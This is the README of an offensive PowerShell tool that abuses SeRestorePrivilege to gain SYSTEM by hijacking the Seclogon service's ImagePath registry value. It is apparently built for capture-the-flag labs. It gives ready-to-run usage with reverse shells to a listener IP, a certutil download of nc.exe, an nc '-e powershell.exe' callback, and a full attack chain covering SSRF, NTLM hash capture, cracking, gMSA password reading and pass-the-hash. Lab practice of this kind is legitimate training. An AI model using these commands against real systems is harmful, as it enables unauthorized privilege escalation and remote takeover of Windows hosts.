# Invoke-SeRestoreAbuse

PowerShell implementation of the SeRestorePrivilege → SYSTEM escalation via the Seclogon service.

Modifies `HKLM\SYSTEM\CurrentControlSet\Services\Seclogon\ImagePath` using backup semantics,
starts the service (which runs as SYSTEM), then restores the original value.

---

## Requirements

- `SeRestorePrivilege` must be **present and enabled** in your current token
- Verify: `whoami /priv` — look for `SeRestorePrivilege ... Enabled`
- evil-winrm sessions as gMSA service accounts often have this already

---

## Usage

### Load the function
```powershell
. .\Invoke-SeRestoreAbuse.ps1
```

### Option A — auto reverse shell (no nc.exe needed)
```powershell
# Start listener first:
# nc -nlvp 443

Invoke-SeRestoreAbuse -Shell -LHOST 192.168.45.166 -LPORT 443
```
Generates and base64-encodes a PowerShell TCP reverse shell automatically.

### Option B — custom command
```powershell
Invoke-SeRestoreAbuse -Command 'cmd /c whoami > C:\tmp\out.txt'
```

### Option C — custom command with nc.exe
```powershell
# Transfer nc.exe first:
# certutil -urlcache -f http://LHOST/nc.exe C:\tmp\nc.exe

Invoke-SeRestoreAbuse -Command 'cmd /c C:\tmp\nc.exe 192.168.45.166 443 -e powershell.exe'
```

---

## Shell Stability

The initial shell is **unstable (~30 seconds)**. The moment it connects, push a
second shell to a second listener before it dies:

```
# Terminal 1 (catches initial SYSTEM shell):
nc -nlvp 443

# Terminal 2 (catches stable second shell):
nc -nlvp 444
```

From the initial SYSTEM shell immediately run:
```powershell
C:\tmp\nc.exe 192.168.45.166 444 -e powershell.exe
```

---

## Known Issue — Type Already Exists

If you see `Cannot add type. The type name 'TokPriv1Luid' already exists` — this happens when
the original script is loaded twice in the same PS session. This version uses `TokPriv1Luid2`
and checks for the type before loading, so you can run it multiple times cleanly.

---

## When to Use This

**Full chain (Heist box pattern):**

```
SSRF (?url= param) 
  → Responder forced SMB auth (file://LHOST/share) 
  → NTLMv2 hash captured 
  → hashcat -m 5600 → plaintext password
  → evil-winrm as enox
  → enox ∈ Web Admins → ReadGMSAPassword on svc_apache$
  → nxc ldap IP -u enox -p pass --gmsa  (or bloodyad)
  → NT hash for svc_apache$
  → evil-winrm -u 'svc_apache$' -H NTHASH
  → whoami /priv shows SeRestorePrivilege Enabled
  → THIS SCRIPT → SYSTEM
```

**Detection signals in winPEAS:**
- `SeRestorePrivilege ... Enabled` in token privileges section
- Service account landing in `C:\Users\svc_something$\Documents`
- A script named `EnableSeRestorePrivilege.ps1` in Documents = box hint

---

## Credits

- Original C++ PoC: [@xct](https://github.com/xct/SeRestoreAbuse)
- Privilege escalation matrix: [@gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- PS port: [@0x4D-5A](https://github.com/0x4D-5A)
- Enhanced with `-Shell` mode and double-load fix: vajra / hacktrack toolkit
